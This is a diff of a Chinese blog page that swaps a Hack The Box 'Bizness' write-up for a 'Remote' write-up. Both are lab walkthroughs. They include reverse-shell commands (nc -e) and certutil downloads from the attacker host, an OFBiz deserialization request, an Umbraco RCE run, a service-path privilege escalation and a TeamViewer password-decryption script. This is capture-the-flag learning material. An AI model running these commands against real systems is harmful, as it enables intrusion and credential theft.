@@ -9,7 +9,7 @@
     
     <title>
         
-            htb bizness复盘 |
+            htb remote复盘 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        htb bizness复盘
+                        htb remote复盘
                     </div>
                 
 
@@ -217,12 +217,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-04-05</span>
+                <span class="datetime">2024-04-08</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Mon Apr 08 2024 15:53:48 GMT+0800">2024-04-08</span>
+                <span class="datetime" data-updated="Mon Apr 08 2024 17:44:22 GMT+0800">2024-04-08</span>
             </span>
         
 
@@ -238,7 +238,7 @@
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/htb/">htb</a></li>
                         
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/linux/">linux</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/windows/">windows</a></li>
                         
                     
                 </ul>
@@ -266,49 +266,96 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Bizness" >https://app.hackthebox.com/machines/Bizness<i class="fas fa-external-link-alt"></i></a></p>
+                    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>为了学windows渗透相关内容，昨天冲动了一把买了htb一个月的会员，为了不浪费这一百块钱，接下来要好好学！</p>
+<p>先做的第一个就是remote靶机，全程看着wp做的，相比linux，很多东西都是陌生的，还是要多做多复盘才能熟悉这个体系，让知识深入我心。</p>
+<h5 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h5><p>官方wp</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
 <p>难度：easy</p>
-<p>IP：10.10.11.252</p>
-<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>端口扫描，扫到22 80 443 40081端口，先看80端口，需要配置hosts文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;10.10.11.252 bizness.htb&#x27; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>ip：10.10.10.180</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>
 
-<p>然后访问网页，翻到最下面发现是apache ofbiz</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405220345.png" ></p>
-<p>查询到有相关漏洞，反序列化命令执行漏洞 CVE-2023-49070，在网上找到<a class="link"   target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md" >poc<i class="fas fa-external-link-alt"></i></a>，按照poc使用</p>
-<p>先下载ysoserial.jar生成base64的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
+<p>一个一个看，开了21端口，用anonymous登陆</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
+<p>没有什么可以利用的，切换到下一个端口</p>
+<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
+<p>然后找到一个登陆点</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >
 
-<p>然后发包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">GET /id</span><br><span class="line">webtools/control/xmlrpc;/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1</span><br><span class="line">Host: bizness.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=42ED2921E0C9B3F3BB49F2D2D2F4030A.jvm1; JSESSIONID=21613FA6F2D87CC9AF8B6AC6A4DF1FF7.jvm1; OFBiz.Visitor=10639</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Length: 4157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;/name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;生成的paylpad&lt;/serializable&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">          &lt;/member&gt;</span><br><span class="line">        &lt;/struct&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/param&gt;</span><br><span class="line">  &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >
 
+<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
+<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
+<p>有个目录，把它给挂载出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>
+
+<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
+<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
+<p>官方给了个提示 <a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
+<p>找到了一串md5，用网站解密，解出来一串是密码</p>
+<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
+<p>拿着账号密码登陆刚刚的登陆框</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
+<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
+<p>poc：<a class="link"   target="_blank" rel="noopener" href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
+<p>下载下来后尝试命令执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
+<p>是成功的，接下来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
+<p>下载一个nc到靶机，再调用，本地开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
 <p>成功拿到第一个shell</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405222320.png" ></p>
-<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><strong>涉及的知识点没见过，记录一下</strong></p>
-<p>通过搜索，找到&#x2F;opt&#x2F;ofbiz&#x2F;runtime&#x2F;data&#x2F;derby&#x2F;ofbiz&#x2F;seg0目录下有很多.dat文件，<strong>derby是个小型数据库</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat * | grep -arin -o -E &#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>上传辅助工具winPEASx64.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><code>(\w+\W+)&#123;0,5&#125;</code>：这是一个正则表达式，用于匹配最多五个字母&#x2F;数字和非字母&#x2F;数字字符的序列。<code>\w+</code> 匹配一个或多个字母&#x2F;数字字符，<code>\W+</code> 匹配一个或多个非字母&#x2F;数字字符，<code>&#123;0,5&#125;</code> 表示该序列最多重复匹配 0 到 5 次。</li>
-<li><code>password</code>：这是正则表达式中的一个具体词汇，表示要匹配的密码。</li>
-</ul>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-06%2000.02.23.png" ></p>
-<p>找到一串，Password&#x3D;”$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I” ，然后用cyberchef对后半段进行处理，解密成16进制的字符串</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406000552.png" ></p>
-<p>把_换成&#x2F;，把-换成+，再base64解码，最后转化到十六进制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashid -emj b8fd3f41a541a435857a8f3e751cc3a91c174362</span><br></pre></td></tr></table></figure>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
+<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>
 
-<p>使用hashid识别一下加密类型</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406001536.png" ></p>
-<p>猜测是120模式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 120 &quot;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&quot; Desktop/rockyou.txt --show</span><br></pre></td></tr></table></figure>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
+<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>
 
-<p>爆出来的密码是monkeybizness</p>
-<p>然后直接su - root登录，权限就到root了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240406002249.png" ></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机最后提取拿密码的思路之前没见过，学习了，然后apache那个反序列化漏洞实践poc的过程很有趣，htb的靶机质量真的可以。</p>
-<p>涉及知识点：poc利用，sha1加盐爆破，信息搜集（敏感数据库泄露），grep正则提取。</p>
-<h4 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h4><p><a class="link"   target="_blank" rel="noopener" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/gsh23/p/18087933" >https://www.cnblogs.com/gsh23/p/18087933<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
+<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
+<p>有一个<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
+<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>
+
+<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
+<p>用以下脚本解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408173948.png" ></p>
+<p>解出密码:!R3m0te!</p>
+<p>测试这个密码能否登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
+<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
+<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
+<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
 
                 </div>
                 
@@ -327,7 +374,7 @@
                                     </li>
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/windows/">windows</a>
                                     </li>
                                 
                             </ul>
@@ -343,31 +390,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/"
-                                   title="htb remote复盘"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb remote复盘</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/"
-                                   title="hackmyvm influencer复盘"
+                                   href="/2024/04/05/htb-bizness%E5%A4%8D%E7%9B%98/"
+                                   title="htb bizness复盘"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">hackmyvm influencer复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">htb bizness复盘</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -395,7 +426,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">5.</span> <span class="nav-text">主要参考文章</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.1.</span> <span class="nav-text">主要参考文章</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">方法一：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
@@ -558,7 +589,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">5.</span> <span class="nav-text">主要参考文章</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.1.</span> <span class="nav-text">主要参考文章</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">2.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">方法一：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
